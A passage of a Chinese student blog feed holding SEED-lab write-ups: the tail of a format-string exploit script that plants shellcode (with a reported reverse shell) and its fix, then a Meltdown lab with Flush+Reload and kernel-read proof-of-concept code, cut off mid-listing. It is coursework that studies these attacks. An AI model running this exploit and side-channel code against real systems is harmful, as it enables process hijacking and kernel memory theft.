class="string">&#x27;little&#x27;</span>)</span><br><span class="line">number  = <span class="number">0x00007fffffffdf1a</span></span><br><span class="line">content[start+<span class="built_in">len</span>(fmt)+<span class="number">32</span>:start+<span class="built_in">len</span>(fmt)+<span class="number">40</span>]  =  (number).to_bytes(<span class="number">8</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">number  = <span class="number">0x00007fffffffdf1c</span></span><br><span class="line">content[start+<span class="built_in">len</span>(fmt)+<span class="number">40</span>:start+<span class="built_in">len</span>(fmt)+<span class="number">48</span>]  =  (number).to_bytes(<span class="number">8</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(fmt)+<span class="number">16</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">content[start+<span class="built_in">len</span>(fmt)+<span class="number">48</span>:start+<span class="built_in">len</span>(fmt)+<span class="number">48</span>+<span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Save the format string to file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2022/04/14/input_check_lab/image-20220421131130079.png" alt="image-20220421131130079"></p><p>接下来尝试反向shell，可以看到也成功了。</p><p><img src="/2022/04/14/input_check_lab/image-20220421131242295.png" alt="image-20220421131242295"></p><h2 id="fix-the-problem"><a href="#fix-the-problem" class="headerlink" title="fix the problem"></a>fix the problem</h2><p>解决这个问题其实很简单..只需要把printf加上一个固定的格式化字符串就可以了。</p><p>将下面的<code>my_printf</code>改成如下所示内容即可。最重要的就是把printf加上一个固定的格式化字符串。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">myprintf</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __x86_64__</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> *framep;</span><br><span class="line">    <span class="comment">// Save the rbp value into framep</span></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;movq %%rbp, %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (framep));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Frame Pointer (inside myprintf):      0x%.16lx\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">long</span>) framep);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The target variable&#x27;s value (before): 0x%.16lx\n&quot;</span>, target);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> *framep;</span><br><span class="line">    <span class="comment">// Save the ebp value into framep</span></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;movl %%ebp, %0&quot;</span> : <span class="string">&quot;=r&quot;</span>(framep));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Frame Pointer (inside myprintf):      0x%.8x\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>) framep);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The target variable&#x27;s value (before): 0x%.8x\n&quot;</span>,   target);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// This line has a format-string vulnerability</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,msg); <span class="comment">// &lt;===== 这里原来是printf(&quot;msg&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __x86_64__</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The target variable&#x27;s value (after):  0x%.16lx\n&quot;</span>, target);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The target variable&#x27;s value (after):  0x%.8x\n&quot;</span>,   target);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样用户就不能控制格式化字符串，只能控制参数。从而让用户失去了对栈操作的权力。</p>]]></content>
      
      
      <categories>
          
          <category> school </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fmtstr </tag>
            
            <tag> software-security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>software-security-lab2</title>
      <link href="/2022/04/07/software-security-lab2/"/>
      <url>/2022/04/07/software-security-lab2/</url>
      
        <content type="html"><![CDATA[<p>大名鼎鼎的meltdown和specture，第一次学竟然还是在学校。<br>关于这两个实验的seedlab报告</p><span id="more"></span><h1 id="meltdown"><a href="#meltdown" class="headerlink" title="meltdown"></a>meltdown</h1><h2 id="task1"><a href="#task1" class="headerlink" title="task1"></a>task1</h2><p>当事先填充array[3]和array[7]的时候，可以看到访问速度明显加快了。</p><p><img src="/2022/04/07/software-security-lab2/image-20220407164214574.png" alt="image-20220407164214574"></p><p><img src="/2022/04/07/software-security-lab2/image-20220407164653089.png" alt="image-20220407164653089"></p><p>这些被提前加载到CPU cache中，导致访问时时间减少。</p><h2 id="task2"><a href="#task2" class="headerlink" title="task2"></a>task2</h2><p>第二部分使用<code>side attack</code>尝试恢复出访问较快的值。可以看到程序开头设置了一个<code>threshold</code>用来标识访问时间小于多少的时候算是访问了已经cache的数组。</p><p>关键代码如下。这里我们遍历数组，并获得访问每个数组之间的cpu line数目</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">reloadSideChannel</span><span class="params">()</span> </span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> junk=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">register</span> <span class="type">uint64_t</span> time1, time2;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">uint8_t</span> *addr;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;</span><br><span class="line">     addr = &amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA];</span><br><span class="line">     time1 = __rdtscp(&amp;junk);</span><br><span class="line">     junk = *addr;</span><br><span class="line">     time2 = __rdtscp(&amp;junk) - time1;</span><br><span class="line">     <span class="keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD)&#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;array[%d*4096 + %d] is in cache.\n&quot;</span>,i,DELTA);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;The Secret = %d.\n&quot;</span>,i);</span><br><span class="line">     &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从之前可以看到存在着一些访问时间会小于这里初始设置的threshold小于80。于是我们就获得了结果。</p><p><img src="/2022/04/07/software-security-lab2/image-20220407173537677.png" alt="image-20220407173537677"></p><p>但是注意可能要多尝试几次才能成功。</p><h2 id="task3"><a href="#task3" class="headerlink" title="task3"></a>task3</h2><p>这里作者实现了一个内核模块。这个内核模块首先打印出<code>secret_data</code>地址，接着用户可以通过这个模块定义的一个module和他交互，使得这个模块把一个<code>secret_data</code>读入内存。我们要做的就是把这个<code>secret data</code>读出。</p><p><img src="/2022/04/07/software-security-lab2/image-20220407181959568.png" alt="image-20220407181959568"></p><p>那么task3的目的就是获得这句输出。</p><h2 id="task4"><a href="#task4" class="headerlink" title="task4"></a>task4</h2><p>task4想让我们做到直接尝试访问内核中的数据。如果不通过<code>meltdown</code>显然是不行的。下面是一个简单的测试。如果我们想通过printf告知我们已经读成功了，那么需要经过很长一系列库函数调用。在这段时间内CPU早就发现了我们已经越界访问，所以不可能成功读出数据。</p><p><img src="/2022/04/07/software-security-lab2/image-20220407182828460.png" alt="image-20220407182828460"></p><p>设计的源代码如下，和文档中给出的一样。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> *kernel_data_addr = (<span class="type">char</span>*)<span class="number">0xf90a3000</span>;</span><br><span class="line"><span class="type">char</span> kernel_data = *kernel_data_addr;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;I have reached here.\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="task5"><a href="#task5" class="headerlink" title="task5"></a>task5</h2><p>由于C没有原生的try…catch函数，我们需要使用<code>sigjmp</code>完成跳转。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> sigjmp_buf jbuf;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">catch_segv</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// Roll back to the checkpoint set by sigsetjmp().</span></span><br><span class="line">  siglongjmp(jbuf, <span class="number">1</span>);                         </span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123; </span><br><span class="line">  <span class="comment">// The address of our secret data</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> kernel_data_addr = <span class="number">0xfb61b000</span>;</span><br><span class="line">  <span class="comment">// Register a signal handler</span></span><br><span class="line">  signal(SIGSEGV, catch_segv);                     </span><br><span class="line">  <span class="keyword">if</span> (sigsetjmp(jbuf, <span class="number">1</span>) == <span class="number">0</span>) &#123;                </span><br><span class="line">     <span class="comment">// A SIGSEGV signal will be raised. </span></span><br><span class="line">     <span class="type">char</span> kernel_data = *(<span class="type">char</span>*)kernel_data_addr; </span><br><span class="line">     <span class="comment">// The following statement will not be executed.</span></span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;Kernel data at address %lu is: %c\n&quot;</span>, </span><br><span class="line">                    kernel_data_addr, kernel_data);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;Memory access violation!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Program continues to execute.\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面借助lab对上面代码理解。</p><ol><li>在main第二行我们创建了一个segmentation fault的handler。这个handler设置段错误的处理函数为我们自定义的<code>catch_segv</code>。</li><li>接着看<code>catch_segv</code>。这是一个长跳转，让我们直接跳转到第17行保存的sigsetjump位置。同时当17行设置buf的时候，这个函数返回0，这导致我们通过17行的if判断。</li><li>在这个判断里面我们尝试访问内核数据。这将导致一个段错误，于是被handler捕获。</li><li>捕获之后我们调用handler中自己设计的<code>siglongjmp(jbuf, 1);</code>跳转到17行，同时返回1.</li><li>返回的1让17行判断不通过，进入else部分。输出一段话：发生了越界访问。</li></ol><p><img src="/2022/04/07/software-security-lab2/%E5%9B%BE%E7%89%87.png" alt="图片"></p><p>运行程序，发现我们在段错误之后依然可以执行。</p><p><img src="/2022/04/07/software-security-lab2/image-20220407184341064.png" alt="image-20220407184341064"></p><h2 id="task6"><a href="#task6" class="headerlink" title="task6"></a>task6</h2><p>task6介绍了CPU乱序执行。用以下代码举例。</p><p><img src="/2022/04/07/software-security-lab2/image-20220407184628762.png" alt="image-20220407184628762"></p><p>这其实在上课也讲过了，就是我们读取虽然会报错，但是CPU乱序执行下，第三条和第四条的汇编指令其实上是被读取到CPU_cache中的。</p><p><img src="/2022/04/07/software-security-lab2/image-20220407192830144.png" alt="image-20220407192830144"></p><p>在这个lab中我们用下面的代码观察乱序执行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;emmintrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;x86intrin.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*********************** Flush + Reload ************************/</span></span><br><span class="line"><span class="type">uint8_t</span> <span class="built_in">array</span>[<span class="number">256</span>*<span class="number">4096</span>];</span><br><span class="line"><span class="comment">/* cache hit time threshold assumed*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CACHE_HIT_THRESHOLD (80)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">flushSideChannel</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Write to array to bring it to RAM to prevent Copy-on-write</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) <span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//flush the values of the array from cache</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">reloadSideChannel</span><span class="params">()</span> </span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> junk=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">register</span> <span class="type">uint64_t</span> time1, time2;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">uint8_t</span> *addr;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;</span><br><span class="line">     addr = &amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA];</span><br><span class="line">     time1 = __rdtscp(&amp;junk);</span><br><span class="line">     junk = *addr;</span><br><span class="line">     time2 = __rdtscp(&amp;junk) - time1;</span><br><span class="line">     <span class="keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD)&#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;array[%d*4096 + %d] is in cache.\n&quot;</span>,i,DELTA);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;The Secret = %d.\n&quot;</span>,i);</span><br><span class="line">     &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*********************** Flush + Reload ************************/</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">meltdown</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> kernel_data_addr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> kernel_data = <span class="number">0</span>;</span><br><span class="line">   </span><br><span class="line">  <span class="comment">// The following statement will cause an exception</span></span><br><span class="line">  kernel_data = *(<span class="type">char</span>*)kernel_data_addr;     </span><br><span class="line">  <span class="built_in">array</span>[<span class="number">7</span> * <span class="number">4096</span> + DELTA] += <span class="number">1</span>;          </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">meltdown_asm</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> kernel_data_addr)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">char</span> kernel_data = <span class="number">0</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">// Give eax register something to do</span></span><br><span class="line">   <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(</span></span><br><span class="line"><span class="params">       <span class="string">&quot;.rept 400;&quot;</span>                </span></span><br><span class="line"><span class="params">       <span class="string">&quot;add $0x141, %%eax;&quot;</span></span></span><br><span class="line"><span class="params">       <span class="string">&quot;.endr;&quot;</span>                    </span></span><br><span class="line"><span class="params">    </span></span><br><span class="line"><span class="params">       :</span></span><br><span class="line"><span class="params">       :</span></span><br><span class="line"><span class="params">       : <span class="string">&quot;eax&quot;</span></span></span><br><span class="line"><span class="params">   )</span>; </span><br><span class="line">    </span><br><span class="line">   <span class="comment">// The following statement will cause an exception</span></span><br><span class="line">   kernel_data = *(<span class="type">char</span>*)kernel_data_addr;  </span><br><span class="line">   <span class="built_in">array</span>[kernel_data * <span class="number">4096</span> + DELTA] += <span class="number">1</span>;           </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// signal handler</span></span><br><span class="line"><span class="type">static</span> sigjmp_buf jbuf;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">catch_segv</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  siglongjmp(jbuf, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// Register a signal handler</span></span><br><span class="line">  signal(SIGSEGV, catch_segv);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// FLUSH the probing array</span></span><br><span class="line">  flushSideChannel();</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span> (sigsetjmp(jbuf, <span class="number">1</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">     meltdown(<span class="number">0xfb61b000</span>);                </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Memory access violation!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// RELOAD the probing array</span></span><br><span class="line">  reloadSideChannel();                     </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码第53行其实就是模拟了把第七个数组元素加载到cache中。所以按理来说我们就应该输出secret=7。本质上这里并没有涉及meltdown获取内核信息。一下需要多尝试几次就能成功了。</p><p><img src="/2022/04/07/software-security-lab2/image-20220407193851723.png" alt="image-20220407193851723"></p><h2 id="task7-1"><a href="#task7-1" class="headerlink" title="task7.1"></a>task7.1</h2><p>首先尝试修改task6的代码到能够读取内核数据。这也很简单，因为之前是写死的第七个cache。这里只要改成<code>array[kernel_data * 4096 + DELTA ]</code>即可。但是我经过很多次尝试，即使修改了threshold到200也没有成功。</p><p>关于修改delta以及这里写4096的原因是：OS里面的一个页面大小是4K,选择DELTA的原因是为了防止0那里有部分数据结构重复。</p><p>同时这里经常返回0的原因是，如果当操作系统检查出来权限不对时，往往会先返回0。可能和spectre的sandbox检查类似。</p><p><img src="/2022/04/07/software-security-lab2/image-20220407203844688.png" alt="image-20220407203844688"></p><h2 id="task7-2"><a href="#task7-2" class="headerlink" title="task7.2"></a>task7.2</h2><p>尝试了直接在代码的main函数部分加上打开文件部分。提前把kern地址加载进来到CPU_cache里面。这样我们执行后面的加法语句就会快很多。</p><p><img src="/2022/04/07/software-security-lab2/image-20220421145721129.png" alt="image-20220421145721129"></p><p><img src="/2022/04/07/software-security-lab2/image-20220407205703737.png" alt="image-20220407205703737"></p><p>但是尽管尝试了修改上界，但是还是不行，不能提前于检查权限获取相应数据。</p><h2 id="task7-3-asm-problem"><a href="#task7-3-asm-problem" class="headerlink" title="task7.3 asm problem"></a>task7.3 asm problem</h2><p>这次直接尝试用汇编触发meltdown。代码如下。尝试解释一下。这里CPU执行的时候会暂停到内联汇编这里(因为很耗时，不停循环做加法，并且由于只能对这一个寄存器操作，所以不能并行)由于乱序执行，CPU会执行到一定数量的add eax后，先执行下面读取kerneldata的部分，获取数据。然而此时ALU单元正在被占用。可以延长检查kernel页表权限的时间。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">meltdown_asm</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> kernel_data_addr)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">char</span> kernel_data = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Give eax register something to do</span></span><br><span class="line">   <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(</span></span><br><span class="line"><span class="params">       <span class="string">&quot;.rept 400;&quot;</span></span></span><br><span class="line"><span class="params">       <span class="string">&quot;add $0x141, %%eax;&quot;</span></span></span><br><span class="line"><span class="params">       <span class="string">&quot;.endr;&quot;</span></span></span><br><span class="line"><span class="params"></span></span><br><span class="line"><span class="params">       :</span></span><br><span class="line"><span class="params">       :</span></span><br><span class="line"><span class="params">       : <span class="string">&quot;eax&quot;</span></span></span><br><span class="line"><span class="params">   )</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// The following statement will cause an exception</span></span><br><span class="line">   kernel_data = *(<span class="type">char</span>*)kernel_data_addr;</span><br><span class="line">   <span class="built_in">array</span>[kernel_data * <span class="number">4096</span> + DELTA] += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过长时间的尝试，终于成功了。结果如下图。</p><p><img src="/2022/04/07/software-security-lab2/image-20220407213402700.png" alt="image-20220407213402700"></p><p>可以看到读出了第一个secret是83。也就是’S’的ascii表示。</p><p>为了读出上述数据，需要融合7.2中的代码，也就是事先利用文件操作读取内核中的相关数据加载到内存中，之后利用<code>meltdown</code>攻击。如下图</p><p><img src="/2022/04/07/software-security-lab2/image-20220407213819615.png" alt="image-20220407213819615">但是可以看出成功概率依然很低。</p><p>尝试增加或者减少循环的次数，看会不会有帮助。我尝试了把循环从400改成4000或者40000，4000的时候有过几次成功，但是发现当改成40000的时候几乎不能成功。但是打开发现编译器似乎没有做优化。这里还不太清楚原因是什么。</p><p><img src="/2022/04/07/software-security-lab2/image-20220407214922124.png" alt="image-20220407214922124"></p><p>总结一下上面所做的优化。</p><ol><li>提前读取secret字符串到cpu_cache。利用之前写的内核模块。</li><li>使用汇编代码+汇编代码内部循环占用ALU，减慢权限检查速度。如想从原理的角度解释汇编循环的意义：重复的汇编占据了ALU，并且只作用在一个寄存器上，不能并行执行。然而当想要访问内核地址时，OS会在译码(不确定)位置提前准备好内存给CPU。然而后面的权限检查需要ALU的参与(回想一下自己写的操作系统，也是先找到了那个内存所在位置，再检查那个页面的权限是否正确的，因此无论如何都会提前load出来)</li></ol><h2 id="task8"><a href="#task8" class="headerlink" title="task8"></a>task8</h2><p>经过简单修改上述代码，就能够成功的一次性获取所有kernel里面的内容了。可以看到我们获取的内容是正确的。</p><p><img src="/2022/04/07/software-security-lab2/image-20220407222031706.png" alt="image-20220407222031706"></p><p>代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 